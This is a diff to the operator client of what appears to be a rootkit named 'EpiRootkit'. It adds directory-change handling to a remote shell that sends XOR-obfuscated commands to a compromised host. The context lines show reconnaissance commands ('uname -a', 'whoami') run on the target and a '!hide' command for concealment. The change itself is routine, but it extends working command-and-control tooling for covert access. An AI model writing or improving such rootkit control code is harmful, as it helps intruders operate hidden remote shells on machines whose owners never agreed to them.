@@ -93,19 +93,40 @@ class EpiRootkitClient:
                 finally:
                     conn.settimeout(None)
                 continue
-            if cmd.startswith("!cd "):
-                path = cmd[4:].strip()
+
+            # Handle cd command (with or without ! prefix)
+            if cmd.startswith("!cd ") or cmd == "!cd":
+                path = cmd[4:].strip() if cmd.startswith("!cd ") else ""
+                if not path:
+                    path = "~"  # Default to home directory if no path specified
                 test_cmd = f"cd {path} && pwd"
                 conn.sendall(xor_encrypt_decrypt(test_cmd.encode()))
                 result = self._receive_output(conn)
-                if result['status'] == 0:
-                    self.remote_dir = path
-                    logging.info("[INFO] Remote directory changed to %s", path)
+                if result['status'] == 0 and result['stdout']:
+                    self.remote_dir = result['stdout'][0]  # Use the pwd output as the new directory
+                    logging.info("[INFO] Remote directory changed to %s", self.remote_dir)
                 else:
                     for line in result['stderr']:
                         print(f"[ERROR] {line}")
                     print(f"[STATUS] Exit code: {result['status']} (Failure)")
                 continue
+            elif cmd.startswith("cd ") or cmd == "cd":
+                # Redirect plain cd to !cd handling
+                path = cmd[3:].strip() if cmd.startswith("cd ") else ""
+                if not path:
+                    path = "~"  # Default to home directory if no path specified
+                test_cmd = f"cd {path} && pwd"
+                conn.sendall(xor_encrypt_decrypt(test_cmd.encode()))
+                result = self._receive_output(conn)
+                if result['status'] == 0 and result['stdout']:
+                    self.remote_dir = result['stdout'][0]  # Use the pwd output as the new directory
+                    logging.info("[INFO] Remote directory changed to %s", self.remote_dir)
+                else:
+                    for line in result['stderr']:
+                        print(f"[ERROR] {line}")
+                    print(f"[STATUS] Exit code: {result['status']} (Failure)")
+                continue
+
             if cmd == "!sysinfo":
                 cmd = "uname -a && uptime && whoami"
             if cmd.startswith("!hide "):
